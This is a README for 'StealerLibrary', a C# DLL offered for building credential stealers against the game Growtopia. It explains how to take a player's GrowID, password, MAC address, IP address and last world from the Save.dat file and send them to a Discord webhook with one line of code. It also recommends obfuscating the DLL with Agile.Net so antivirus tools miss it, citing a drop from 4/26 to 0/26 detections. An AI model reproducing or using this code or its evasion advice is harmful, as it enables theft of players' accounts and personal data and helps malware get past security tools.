# StealerLibrary
Growtopia (Save.dat) Stealer Library that basically let you to write a stealer with 1 line of code.

## Compiled Version: [Release V1](https://github.com/extatent/StealerLibrary/releases/tag/V1)

### Compile the source code with Visual Studio and add the .DLL to the references in your project and start writting the code below.

#### Your program might be FUD, but the .DLL isn't, use any obfuscator to make it FUD. (Used [Agile.Net](https://secureteam.net/acode-features-detailed) Scan Results 0/26) (Without Obfuscator 4/26)

## Example Usage : 

```csharp
using StealerLibrary;
using System;

namespace Example
{
    class Program
    {
        private static void Main()
        {
            Growtopia.Stealer("https://discord.com/api/webhooks/1234567891011/WebhookUrl", "ProfilePictureUrl [Optional]", "Webhook Name", true, true, false);
        }
    }
}
```
1. Webhook Url
2. Profile Picture Url
3. Webhook Name
4. Last World (True/False)
5. MAC Address (True/False)
6. IP Address (True/False)

## Features

- GrowID
- Password
- Last World (Customizable: True/False)
- MAC Address (Customizable: True/False)
- IP Address (Customizable: True/False)

<img src="http://anarchy.5v.pl/example.png" alt="png">

## StealerLibrary is licensed under the GNU General Public License v3.0. Before doing anything with the source code, please read [this.](https://www.gnu.org/licenses/gpl-3.0.html)
